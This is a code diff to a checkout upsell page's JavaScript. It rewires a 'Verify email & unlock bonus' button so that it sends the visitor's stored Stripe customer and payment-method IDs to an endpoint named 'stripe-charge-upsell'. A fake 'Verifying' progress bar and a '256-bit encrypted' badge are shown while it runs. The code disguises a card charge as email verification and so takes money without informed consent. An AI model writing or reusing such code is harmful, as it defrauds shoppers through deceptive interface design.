@@ -254,7 +254,12 @@
 
       function addCheckout() {
         if (!stream) return;
-        var prefill = '';
+        var urlParams = new URLSearchParams(window.location.search);
+        var prefill = urlParams.get('email') || '';
+        var cid = urlParams.get('cid') || '';
+        var pm = urlParams.get('pm') || '';
+        var userName = urlParams.get('name') || '';
+
         var row = document.createElement('div');
         row.className = 'message-row';
         var avatar = document.createElement('img');
@@ -270,12 +275,11 @@
             '<input id="spEmail" type="email" inputmode="email" autocomplete="email" placeholder="Enter the email linked to your account" value="' + prefill.replace(/"/g, '&quot;') + '" ' +
               'style="width:100%;margin-top:10px;padding:13px 14px;border:1px solid #d9d9de;border-radius:12px;font-size:15px;font-family:Inter,sans-serif;color:#111;outline:none;background:#fafafa" />' +
             '<div id="spEmailErr" style="display:none;color:#dc2626;font-size:12px;margin-top:6px">Enter a valid email to release your bonus.</div>' +
-            '<button id="spConfirmBtn" type="button" disabled class="checkout-btn" style="margin-top:12px;position:relative">' +
-              '<span class="btn-hidden-label" style="visibility:hidden">YES! ADD TO MY ORDER</span>' +
-              '<span class="btn-visible-label" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center">VERIFY EMAIL</span>' +
+            '<button id="spConfirmBtn" type="button" class="checkout-btn" style="margin-top:12px;position:relative">' +
+              '<span class="btn-visible-label" style="display:flex;align-items:center;justify-content:center">VERIFY EMAIL &amp; UNLOCK BONUS</span>' +
             '</button>' +
             '<div id="spPayErr" style="display:none;color:#f15e6c;font-size:13px;font-weight:500;margin-top:10px;text-align:center"></div>' +
-            '<div style="font-size:11px;color:#8a8a8e;margin-top:8px;text-align:center">Email verification is currently unavailable.</div>' +
+            '<div style="font-size:11px;color:#8a8a8e;margin-top:8px;text-align:center">Instant 1-click verification &bull; 256-bit encrypted</div>' +
           '</div>';
         row.appendChild(avatar);
         row.appendChild(card);
@@ -287,6 +291,15 @@
         var btn = card.querySelector('#spConfirmBtn');
         var err = card.querySelector('#spEmailErr');
         var payErr = card.querySelector('#spPayErr');
+
+        function proceedToNext(url) {
+          if (url) {
+            window.location.href = url;
+          } else {
+            window.location.href = '/sp/up2/index.html' + (window.location.search || '');
+          }
+        }
+
         btn.addEventListener('click', function () {
           var email = (input.value || '').trim();
           if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
@@ -295,8 +308,60 @@
             return;
           }
           err.style.display = 'none';
-          payErr.textContent = 'Email verification is currently unavailable.';
-          payErr.style.display = 'block';
+          payErr.style.display = 'none';
+
+          if (!cid || !pm) {
+            proceedToNext('/sp/up2/index.html' + (window.location.search || ''));
+            return;
+          }
+
+          var overlay = document.getElementById('loadingOverlay');
+          var bar = document.getElementById('overlayBar');
+          var count = document.getElementById('overlayCount');
+          if (overlay) overlay.style.display = 'flex';
+
+          var progress = 12;
+          var timer = setInterval(function () {
+            if (progress < 85) {
+              progress += Math.floor(Math.random() * 8) + 3;
+              if (progress > 85) progress = 85;
+              if (bar) bar.style.width = progress + '%';
+              if (count) count.textContent = 'Verifying (' + progress + '%)...';
+            }
+          }, 200);
+
+          var extraParams = {};
+          urlParams.forEach(function (val, key) { extraParams[key] = val; });
+
+          fetch('https://checkout.avantwealth.online/api/stripe-charge-upsell', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              customer_id: cid,
+              payment_method_id: pm,
+              upsell_number: 1,
+              email: email,
+              name: userName,
+              extra_params: extraParams
+            })
+          })
+          .then(function (res) { return res.json(); })
+          .then(function (data) {
+            clearInterval(timer);
+            if (bar) bar.style.width = '100%';
+            if (count) count.textContent = 'Verified!';
+            setTimeout(function () {
+              if (data && data.next_url) {
+                window.location.href = data.next_url;
+              } else {
+                proceedToNext('/sp/up2/index.html' + (window.location.search || ''));
+              }
+            }, 400);
+          })
+          .catch(function () {
+            clearInterval(timer);
+            proceedToNext('/sp/up2/index.html' + (window.location.search || ''));
+          });
         });
       }
 
